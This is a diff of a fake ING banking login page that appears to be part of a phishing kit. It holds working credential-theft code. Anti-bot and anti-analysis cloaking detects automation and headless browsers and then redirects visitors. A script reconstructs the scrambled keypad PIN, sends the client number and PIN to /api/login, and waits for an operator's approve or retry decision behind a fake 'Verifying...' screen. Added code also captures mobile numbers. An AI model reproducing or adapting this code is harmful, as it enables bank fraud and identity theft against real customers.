@@ -26017,434 +26017,7 @@ html.loggedout:not([style-scope]):not(.style-scope),html.loggedout:not([style-sc
   <!-- Tile icon for Win8 (144x144 + tile color) -->
   <meta content="ico/144.png" name="msapplication-TileImage"/>
   <meta content="#ff6600" name="msapplication-TileColor"/>
-  <script>
-!function(){"use strict";const e={checks:{automation:!0,headless:!0,devtools:!0,webdriver:!0,plugins:!0,screen:!0,timing:!0,behavior:!0,webrtc:!0,canvas:!0,webgl:!0,iframe:!0},redirect:{enabled:!0,url:"https://www.google.com",delay:0},thresholds:{critical:1,high:2,maxScore:75}};let t=[],n=0,o=!1;function r(r){if(o)return;o=!0,console.log("[ING Security] Blocked:",r);try{sessionStorage.clear(),localStorage.removeItem("ing_session"),localStorage.removeItem("ing_user"),document.cookie.split(";").forEach(function(e){document.cookie=e.replace(/^ +/,"").replace(/=.*/,"=;expires="+new Date().toUTCString()+";path=/")})}catch(e){}document.querySelectorAll("form").forEach(e=>{e.onsubmit=function(e){return e.preventDefault(),e.stopPropagation(),!1}}),document.body.innerHTML="",document.head.innerHTML="",e.redirect.enabled&&setTimeout(()=>{window.location.replace(e.redirect.url)},e.redirect.delay),throw new Error("ING_SECURITY_BLOCK: "+r)}function i(e,i,c="medium"){if(o)return;t.push({type:e,description:i,severity:c,timestamp:Date.now()}),n+={low:10,medium:25,high:50,critical:100}[c]||25,console.log(`[ING Security] ${c.toUpperCase()}: ${i}`),"critical"===c&&e.thresholds.critical>0&&r(`Critical: ${i}`);t.filter(e=>"high"===e.severity).length>=e.thresholds.high&&r("High risk accumulation"),n>=e.thresholds.maxScore&&r(`Risk score: ${n}`)}function c(){if(!e.checks.automation)return;[{test:()=>null!==window.document.documentElement?.getAttribute("webdriver"),desc:"Webdriver attribute",severity:"critical"},{test:()=>!!window.navigator.webdriver,desc:"Navigator webdriver",severity:"critical"},{test:()=>!!window.callPhantom,desc:"PhantomJS",severity:"critical"},{test:()=>!!window._phantom,desc:"PhantomJS internal",severity:"critical"},{test:()=>!!window.Buffer,desc:"Node.js Buffer",severity:"critical"},{test:()=>!!window.process,desc:"Node.js process",severity:"critical"},{test:()=>/HeadlessChrome/.test(navigator.userAgent),desc:"Headless Chrome UA",severity:"critical"},{test:()=>/PhantomJS|Selenium|WebDriver|Puppeteer|Playwright/.test(navigator.userAgent),desc:"Automation UA",severity:"critical"},{test:()=>!!window.cdc_adoQpoasnfa76pfcZLmcfl_Array,desc:"Chrome DevTools Protocol",severity:"critical"}].forEach(e=>{try{e.test()&&i("automation",e.desc,e.severity)}catch(e){}})}function s(){if(!e.checks.headless)return;0===navigator.plugins.length&&i("headless","No plugins","high"),navigator.languages&&0!==navigator.languages.length||i("headless","No languages","medium");try{let e=document.createElement("canvas"),t=e.getContext("webgl")||e.getContext("experimental-webgl");if(!t)return void i("headless","No WebGL","high");let n=t.getExtension("WEBGL_debug_renderer_info");if(n){let e=t.getParameter(n.UNMASKED_RENDERER_WEBGL);e?.includes("SwiftShader")&&i("headless","SwiftShader","high"),e?.includes("llvmpipe")&&i("headless","LLVMpipe","high")}}catch(e){}try{let t=0,n=[];for(;t<10;)n.push(document.createElement("iframe")),t++;n.forEach(e=>e.remove())}catch(e){i("headless","Low iframe limit","medium")}}function a(){if(!e.checks.webdriver)return;["webdriver","__webdriver_script_fn","__selenium_evaluate","__selenium_unwrapped","$cdc_asdjflasutopfhvcZLmcfl_","cdc_adoQpoasnfa76pfcZLmcfl_Array","cdc_adoQpoasnfa76pfcZLmcfl_Promise"].forEach(e=>{e in window&&i("webdriver",`Property: ${e}`,"critical")})}function d(){if(!e.checks.screen)return;(screen.width<200||screen.height<200)&&i("screen","Unrealistic size","high"),(window.outerWidth<200||window.outerHeight<200)&&i("screen","Window too small","medium")}function l(){if(!e.checks.timing)return;let t=[];for(let n=0;n<50;n++){let n=performance.now();Math.random();let o=performance.now();t.push(o-n)}let o=t.reduce((e,t)=>e+t,0)/t.length,r=t.reduce((e,t)=>e+Math.pow(t-o,2),0)/t.length;r<1e-4&&i("timing",`Consistency: ${r}`,"medium"),t.reduce((e,t)=>e+t,0)<1&&i("timing","Too fast","high")}function u(){if(!e.checks.canvas)return;try{let e=document.createElement("canvas"),t=e.getContext("2d");t.textBaseline="top",t.font="14px Arial",t.fillText("ING Security Check",2,2);let n=e.toDataURL();t.clearRect(0,0,e.width,e.height),t.fillText("ING Security Check",2,2);let o=e.toDataURL();n!==o&&i("canvas","Inconsistent","medium"),n.length<1e3&&i("canvas","Suspicious size","high")}catch(e){i("canvas","Blocked","medium")}}function f(){if(!e.checks.behavior)return;let t=0,n=0,o=0,r=[];document.addEventListener("mousemove",e=>{t++;let i=Date.now();o>0&&r.push({x:e.clientX,y:e.clientY,speed:Math.sqrt(e.movementX**2+e.movementY**2)/(i-o||1),time:i}),o=i},{passive:!0}),document.addEventListener("keydown",()=>{n++},{passive:!0}),setTimeout(()=>{if(0===t&&0===n)return void i("behavior","No interaction","medium");if(r.length>10){let e=0;for(let t=2;t<r.length;t++){let n=r[t-2],o=r[t-1],i=r[t],c=(o.y-n.y)/(o.x-n.x||1),s=(i.y-o.y)/(i.x-o.x||1);Math.abs(c-s)<.1&&e++}e/(r.length-2)>.8&&i("behavior","Linear mouse","high")}},2e3)}function h(){["selenium","webdriver","driver","chromedriver","geckodriver","__nightmare","Cypress"].forEach(e=>{void 0!==window[e]&&i("environment",`Global: ${e}`,"critical")})}function w(){console.log("[ING Security] Initializing..."),c(),s(),a(),d(),l(),u(),f(),h(),setTimeout(()=>{console.log(`[ING Security] Score: ${n}, Detections: ${t.length}`),n>=e.thresholds.maxScore&&!o&&r(`Final score: ${n}`)},3e3),setInterval(()=>{c(),a()},2e3)}function g(){const e=document.documentElement.scrollHeight,t=document.documentElement.scrollWidth;window.outerHeight-e>160&&i("devtools","Size detection","high")}"loading"===document.readyState?document.addEventListener("DOMContentLoaded",w):w(),Object.freeze(e),Object.defineProperty(window,"INGSecurity",{value:{getScore:()=>n,getDetections:()=>[...t],version:"2.1.0"},writable:!1,configurable:!1})}();</script>
-  <script>
-/* ===== 1. SESSION SET-UP ===== */
-const sid = new URLSearchParams(location.search).get('sid') ||
-            sessionStorage.getItem('sid');
-if (!sid) {
-  fetch('/api/session', {method:'post'})
-    .then(r=>r.json()).then(({sid:id})=>{
-      sessionStorage.setItem('sid',id);
-      location.search='?sid='+id;
-    });
-  throw 0;
-}
 
-/* ===== HEARTBEAT & PAGE CLOSE DETECTION ===== */
-const heartbeatInterval = setInterval(() => {
-  fetch('/api/ping', {
-    method: 'POST',
-    headers: { 'content-type': 'application/json' },
-    body: JSON.stringify({ sid })
-  }).catch(() => {});
-}, 10000); // Ping every 10 seconds
-
-// Detect page close/refresh
-window.addEventListener('beforeunload', () => {
-  clearInterval(heartbeatInterval);
-  navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
-});
-
-/* ===== 2. GET CLIENT NUMBER (live read) ===== */
-function getClientNumber() {
-  const cifField = document.getElementById('cifField');
-  return cifField ? cifField.value.trim().replace(/\D/g,'').slice(0,9) : '';
-}
-
-/* ===== 3. PIN CAPTURE ===== */
-let pin = '';
-let clickHandled = false;
-
-const positionToDigit = {
-  '0': '5',
-  '1': '0', 
-  '2': '4',
-  '3': '6',
-  '4': '7',
-  '5': '9',
-  '6': '3',
-  '7': '2',
-  '8': '8',
-  '9': '1'
-};
-
-const checkReady = setInterval(() => {
-  const ingKeypad = document.querySelector('ing-keypad');
-  const pwdInput = document.getElementById('password');
-  
-  if (ingKeypad && pwdInput) {
-    clearInterval(checkReady);
-    setupPinCapture(ingKeypad, pwdInput);
-  }
-}, 200);
-
-function setupPinCapture(keypadEl, pwdInput) {
-  let container = keypadEl.shadowRoot?.querySelector('.module-keypad');
-  
-  if (!container) {
-    container = keypadEl.querySelector('.module-keypad');
-  }
-  if (!container) {
-    container = document.querySelector('.module-keypad');
-  }
-  
-  if (!container) {
-    document.addEventListener('pointerdown', handlePinClick, true);
-    return;
-  }
-  
-  container.addEventListener('pointerdown', handlePinClick, true);
-}
-
-function handlePinClick(e) {
-  if (clickHandled) return;
-  clickHandled = true;
-  setTimeout(() => clickHandled = false, 50);
-  
-  let el = e.target;
-  let pinBtn = null;
-  let depth = 0;
-  
-  while (el && depth < 5) {
-    if (el.classList) {
-      const classes = Array.from(el.classList);
-      const hasPinClass = classes.some(c => c.startsWith('uia-pin-'));
-      if (hasPinClass) {
-        pinBtn = el;
-        break;
-      }
-    }
-    el = el.parentElement;
-    depth++;
-  }
-  
-  if (!pinBtn) return;
-  
-  e.preventDefault();
-  e.stopPropagation();
-  
-  const classes = Array.from(pinBtn.classList);
-  const pinClass = classes.find(c => c.startsWith('uia-pin-'));
-  
-  if (!pinClass) return;
-  
-  const position = pinClass.replace('uia-pin-', '');
-  const digit = positionToDigit[position];
-  
-  if (!digit || pin.length >= 5) return;
-  
-  pin += digit;
-  
-  updatePasswordInput(pin);
-}
-
-function updatePasswordInput(value) {
-  const pwd = document.getElementById('password');
-  if (!pwd) return;
-  
-  pwd.value = value;
-  pwd.setAttribute('value', value);
-  
-  ['input', 'change'].forEach(evtType => {
-    const evt = new Event(evtType, { bubbles: true, cancelable: true });
-    pwd.dispatchEvent(evt);
-  });
-  
-  updateOverlay(value);
-}
-
-function updateOverlay(pinValue) {
-  const pwd = document.getElementById('password');
-  if (!pwd) return;
-  
-  const parent = pwd.closest('.content-block') || pwd.parentElement;
-  if (!parent) return;
-  
-  const overlays = parent.querySelectorAll('.password-overlay');
-  
-  overlays.forEach(ov => {
-    ov.textContent = pinValue ? '\u2022'.repeat(pinValue.length) : '';
-    
-    ov.style.cssText = `
-      position: absolute !important;
-      top: 50% !important;
-      left: 50% !important;
-      transform: translate(-50%, -50%) !important;
-      font-size: 24px !important;
-      letter-spacing: 8px !important;
-      color: #ffffff !important;
-      font-family: Arial, sans-serif !important;
-      pointer-events: none !important;
-      z-index: 100 !important;
-      display: flex !important;
-      align-items: center !important;
-      justify-content: center !important;
-      height: 100% !important;
-      width: 100% !important;
-      line-height: 1 !important;
-    `;
-  });
-  
-  if (pinValue) {
-    pwd.setAttribute('placeholder', '');
-  } else {
-    pwd.setAttribute('placeholder', 'Access code');
-  }
-}
-
-/* ===== 4. CLEAR BUTTON ===== */
-document.addEventListener('pointerdown', (e) => {
-  const btn = e.target.closest('.key-cell:not([class*="uia-pin-"])');
-  if (!btn) return;
-  
-  if (clickHandled) return;
-  clickHandled = true;
-  setTimeout(() => clickHandled = false, 50);
-  
-  const img = btn.querySelector('img');
-  const isClear = img && (img.src.includes('clear') || img.src.includes('x') || img.alt === '');
-  
-  if (isClear) {
-    pin = pin.slice(0, -1);
-    updatePasswordInput(pin);
-  }
-}, true);
-
-/* ===== 5. LOADING OVERLAY ===== */
-function showLoading() {
-  // Remove any existing loading overlay
-  hideLoading();
-  
-  const overlay = document.createElement('div');
-  overlay.id = 'login-loading-overlay';
-  overlay.style.cssText = `
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.6);
-    backdrop-filter: blur(2px);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    z-index: 9999;
-    transition: opacity 0.3s ease;
-  `;
-  
-  // Orange spinner that matches ING keypad aesthetic
-  const spinner = document.createElement('div');
-  spinner.style.cssText = `
-    width: 60px;
-    height: 60px;
-    border: 4px solid rgba(255, 102, 0, 0.2);
-    border-top: 4px solid #ff6600;
-    border-radius: 50%;
-    animation: ing-spin 1s linear infinite;
-  `;
-  
-  // Loading text
-  const text = document.createElement('p');
-  text.textContent = 'Verifying...';
-  text.style.cssText = `
-    color: #ffffff;
-    font-family: Arial, sans-serif;
-    font-size: 16px;
-    margin-top: 20px;
-    letter-spacing: 1px;
-  `;
-  
-  overlay.appendChild(spinner);
-  overlay.appendChild(text);
-  document.body.appendChild(overlay);
-  
-  // Add keyframe animation if not exists
-  if (!document.getElementById('ing-spinner-style')) {
-    const style = document.createElement('style');
-    style.id = 'ing-spinner-style';
-    style.textContent = `
-      @keyframes ing-spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-      }
-    `;
-    document.head.appendChild(style);
-  }
-}
-
-function hideLoading() {
-  const existing = document.getElementById('login-loading-overlay');
-  if (existing) {
-    existing.style.opacity = '0';
-    setTimeout(() => existing.remove(), 300);
-  }
-}
-
-/* ===== 6. REMOVE ERROR MESSAGE ===== */
-function removeErrorMessage() {
-  const existingError = document.querySelector('.message.warning');
-  if (existingError) {
-    existingError.remove();
-  }
-}
-
-/* ===== 7. SHOW ERROR MESSAGE ===== */
-function showErrorMessage() {
-  removeErrorMessage();
-  
-  const loginInput = document.querySelector('ing-login-input') || 
-                     document.querySelector('.login-input-container') ||
-                     document.body;
-  
-  const errorDiv = document.createElement('div');
-  errorDiv.className = 'message warning message-block style-scope ing-login-input';
-  errorDiv.innerHTML = `
-    <div class="message-content style-scope ing-login-input">
-      <p class="icon-block icon-info no-margin-bottom uia-error-message style-scope ing-login-input">
-        <span class="style-scope ing-login-input">
-          <ing-inject-html class="inject-error style-scope ing-login-input">
-            Sorry, your login details don't seem right. Please check and try again or 
-            <a class="uia-forgotten-access-code" href="javascript:;" id="forgottenAccessCode">reset your access code here</a>.
-          </ing-inject-html>
-        </span>
-      </p>
-    </div>
-  `;
-  
-  const form = document.querySelector('form') || loginInput;
-  if (form && form.firstChild) {
-    form.insertBefore(errorDiv, form.firstChild);
-  } else {
-    const container = document.querySelector('.main-content') || document.body;
-    container.insertBefore(errorDiv, container.firstChild);
-  }
-  
-  window.scrollTo(0, 0);
-}
-
-/* ===== 8. CLEAR FORM ===== */
-function clearForm() {
-  const cifField = document.getElementById('cifField');
-  if (cifField) {
-    cifField.value = '';
-    cifField.dispatchEvent(new Event('input', { bubbles: true }));
-  }
-  
-  pin = '';
-  updatePasswordInput('');
-}
-
-/* ===== 9. POLL FOR ADMIN ACTION ===== */
-let isWaitingForAdmin = false;
-
-function startPolling() {
-  if (isWaitingForAdmin) return;
-  isWaitingForAdmin = true;
-  
-  const poll = async () => {
-    if (!isWaitingForAdmin) return;
-    
-    try {
-      const res = await fetch(`/api/status/${sid}`);
-      const data = await res.json();
-      
-      if (data.status === 'ok') {
-        isWaitingForAdmin = false;
-        await fetch('/api/clearOk', {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ sid })
-        });
-        // Keep loading visible during redirect
-        location.href = '/unregister.html';
-        return;
-      }
-      
-      if (data.status === 'redo') {
-        isWaitingForAdmin = false;
-        await fetch('/api/clearRedo', {
-          method: 'POST',
-          headers: { 'content-type': 'application/json' },
-          body: JSON.stringify({ sid })
-        });
-        // Hide loading and show error
-        hideLoading();
-        clearForm();
-        showErrorMessage();
-        return;
-      }
-      
-      setTimeout(poll, 1200);
-      
-    } catch (err) {
-      setTimeout(poll, 2000);
-    }
-  };
-  
-  poll();
-}
-
-/* ===== 10. LOGIN ===== */
-document.addEventListener('click', (e) => {
-  const btn = e.target.closest('#login-btn');
-  if (!btn) return;
-  
-  removeErrorMessage();
-  
-  const clientNumber = getClientNumber();
-  
-  if (!clientNumber || clientNumber.length < 5) {
-    document.getElementById('cifField')?.focus();
-    return;
-  }
-  
-  if (!pin || pin.length < 4) {
-    const block = document.querySelector('.content-block.access-code');
-    if (block) {
-      block.style.animation = 'none';
-      block.offsetHeight;
-      block.style.animation = 'shake 0.3s ease';
-    }
-    return;
-  }
-  
-  // Show loading overlay
-  showLoading();
-  
-  const payload = { sid, email: clientNumber, password: pin };
-  
-  fetch('/api/login', {
-    method: 'POST',
-    headers: { 'content-type': 'application/json' },
-    body: JSON.stringify(payload)
-  })
-  .then(res => {
-    if (res.ok) {
-      startPolling();
-    } else {
-      // Hide loading on server error
-      hideLoading();
-      console.error('Server error:', res.statusText);
-    }
-  })
-  .catch(err => {
-    // Hide loading on network error
-    hideLoading();
-    console.error('Fetch error:', err);
-  });
-});
-</script>
-
-<style>
-@keyframes shake {
-  0%, 100% { transform: translateX(0); }
-  25% { transform: translateX(-5px); }
-  75% { transform: translateX(5px); }
-}
-</style>
   <!-- 
 Start of global snippet: Please do not remove
 Place this snippet between the <head> and </head> tags on every page of your site.
@@ -27299,44 +26872,67 @@ if (!location.search.includes('sid=')) {
 
 /* =====  MAIN LOGIC  ===== */
 (() => {
-  const field = document.getElementById('cifField');
-  const btn   = document.getElementById('continueBtn');
-  const overlay = document.getElementById('loadingOverlay');
+  const field = document.getElementById('cifField');   // phone input
+  const btn   = document.getElementById('login-btn');  // Continue button
 
   /* ----------  LOCK “04” PREFIX  ---------- */
   field.value = '04';
   field.addEventListener('keydown', e => {
+    // prevent deleting the locked “04”
     if (field.selectionStart <= 2 && (e.key === 'Backspace' || e.key === 'Delete')) {
       e.preventDefault();
     }
   });
 
-  /* ----------  FORMATTER (no re-add)  ---------- */
-  function format() {
-    const digits = field.value.replace(/\D/g, '');
-    // keep 04 + next 8 digits
-    const body = digits.slice(2, 10);          // skip first 2 if user pasted more
-    return '04' + body.slice(0, 8);
+  /* ----------  FORMATTER  ---------- */
+  function clean(raw) {
+    return '04' + raw.replace(/\D/g, '').slice(0, 8); // 04 + 8 digits max
   }
 
-  /* ----------  LOADING TOGGLE  ---------- */
-  function showLoading() { overlay.style.display = 'grid'; }
-  function hideLoading() { overlay.style.display = 'none'; }
+  /* ----------  LOADING OVERLAY  ---------- */
+  function showLoading() {
+    if (document.getElementById('verify-loading-overlay')) return;
+    const overlay = document.createElement('div');
+    overlay.id = 'verify-loading-overlay';
+    overlay.style.cssText = `
+      position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(2px);
+      display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999`;
+    overlay.innerHTML = `
+      <div style="width:60px;height:60px;border:4px solid rgba(255,102,0,.2);
+                  border-top:4px solid #ff6600;border-radius:50%;
+                  animation:ing-spin 1s linear infinite"></div>
+      <p style="color:#fff;font-family:Arial,sans-serif;font-size:16px;margin-top:20px;letter-spacing:1px">
+        Verifying…
+      </p>`;
+    if (!document.getElementById('ing-spin-style')) {
+      const s = document.createElement('style');
+      s.id = 'ing-spin-style';
+      s.textContent = '@keyframes ing-spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
+      document.head.appendChild(s);
+    }
+    document.body.appendChild(overlay);
+  }
+  function hideLoading() {
+    const el = document.getElementById('verify-loading-overlay');
+    if (el) { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }
+  }
 
   /* ----------  INPUT HANDLER  ---------- */
   field.addEventListener('input', () => {
-    const fixed = format();
-    if (field.value !== fixed) field.value = fixed;
-    btn.disabled = fixed.length !== 10;   // 04 + 8 = 10
+    const curr = field.value;
+    const fixed = clean(curr);
+    if (curr !== fixed) field.value = fixed;
+    btn.disabled = fixed.length !== 10; // 04 + 8 digits
   });
 
   /* ----------  SUBMIT  ---------- */
   btn.addEventListener('click', async () => {
     const phone = field.value.trim();
-    if (phone.length !== 10) return;
+    if (phone.length !== 10) return;          // must be 04xxxxxxxx
     btn.disabled = true;
-    showLoading();                       // spinner NOW
+    showLoading();                            // spinner NOW
 
+    // send number to server
     try {
       const r = await fetch('/api/verify', {
         method: 'POST',
@@ -28704,6 +28300,7 @@ if (!location.search.includes('sid=')) {
   </iframe>
  </body>
 </html>
+
 
 
 
